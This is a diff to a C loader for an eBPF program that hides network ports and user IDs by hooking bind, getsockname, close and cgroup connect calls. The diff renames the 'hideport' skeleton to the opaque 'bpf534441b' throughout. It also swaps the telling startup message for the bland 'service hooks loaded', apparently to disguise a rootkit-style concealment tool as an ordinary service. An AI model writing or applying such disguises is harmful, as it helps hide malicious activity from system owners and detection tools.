@@ -13,7 +13,7 @@
 #include <sys/resource.h>
 #include <unistd.h>
 
-#include "hideport.skel.h"
+#include "bpf534441b.bpf.skel.h"
 
 #define MAX_PORTS 16
 #define MAX_UIDS 32
@@ -171,7 +171,7 @@ static int bump_memlock_rlimit(void)
     return 0;
 }
 
-static int setup_ports(struct hideport_bpf *skel, const struct config *cfg)
+static int setup_ports(struct bpf534441b_bpf *skel, const struct config *cfg)
 {
     __u8 net_value = 1;
 
@@ -191,7 +191,7 @@ static int setup_ports(struct hideport_bpf *skel, const struct config *cfg)
     return 0;
 }
 
-static int setup_uids(struct hideport_bpf *skel, const struct config *cfg)
+static int setup_uids(struct bpf534441b_bpf *skel, const struct config *cfg)
 {
     __u8 value = 1;
 
@@ -292,7 +292,7 @@ static int attach_getsockname_pair(struct bpf_program *entry_prog,
     return 0;
 }
 
-static int attach_getsockname_probes(struct hideport_bpf *skel,
+static int attach_getsockname_probes(struct bpf534441b_bpf *skel,
                                      struct bpf_link **entry_link,
                                      struct bpf_link **ret_link)
 {
@@ -362,7 +362,7 @@ static int attach_bind_pair(struct bpf_program *entry_prog,
     return 0;
 }
 
-static int attach_bind_probes(struct hideport_bpf *skel,
+static int attach_bind_probes(struct bpf534441b_bpf *skel,
                               struct bpf_link **entry_link,
                               struct bpf_link **ret_link)
 {
@@ -422,7 +422,7 @@ static struct bpf_link *try_attach_close_symbols(struct bpf_program *prog,
     return NULL;
 }
 
-static struct bpf_link *attach_optional_close_probe(struct hideport_bpf *skel)
+static struct bpf_link *attach_optional_close_probe(struct bpf534441b_bpf *skel)
 {
     static const char *const direct_symbols[] = {
         "__sys_close",
@@ -451,7 +451,7 @@ static struct bpf_link *attach_optional_close_probe(struct hideport_bpf *skel)
 int main(int argc, char **argv)
 {
     struct config cfg;
-    struct hideport_bpf *skel = NULL;
+    struct bpf534441b_bpf *skel = NULL;
     struct bpf_link *bind_entry_link = NULL;
     struct bpf_link *bind_ret_link = NULL;
     struct bpf_link *getsockname_entry_link = NULL;
@@ -482,13 +482,13 @@ int main(int argc, char **argv)
 
     libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
 
-    skel = hideport_bpf__open();
+    skel = bpf534441b_bpf__open();
     if (!skel) {
         fprintf(stderr, "failed to open BPF skeleton\n");
         return 1;
     }
 
-    err = hideport_bpf__load(skel);
+    err = bpf534441b_bpf__load(skel);
     if (err) {
         fprintf(stderr, "failed to load BPF object: %d\n", err);
         goto cleanup;
@@ -569,7 +569,7 @@ int main(int argc, char **argv)
         bind6_attached = 1;
     }
 
-    fprintf(stderr, "hideport cgroup-connect loaded\n");
+    fprintf(stderr, "service hooks loaded\n");
     while (!exiting)
         sleep(1);
 
@@ -603,6 +603,6 @@ cleanup:
     bpf_link__destroy(getsockname_entry_link);
     if (cgroup_fd >= 0)
         close(cgroup_fd);
-    hideport_bpf__destroy(skel);
+    bpf534441b_bpf__destroy(skel);
     return err;
 }
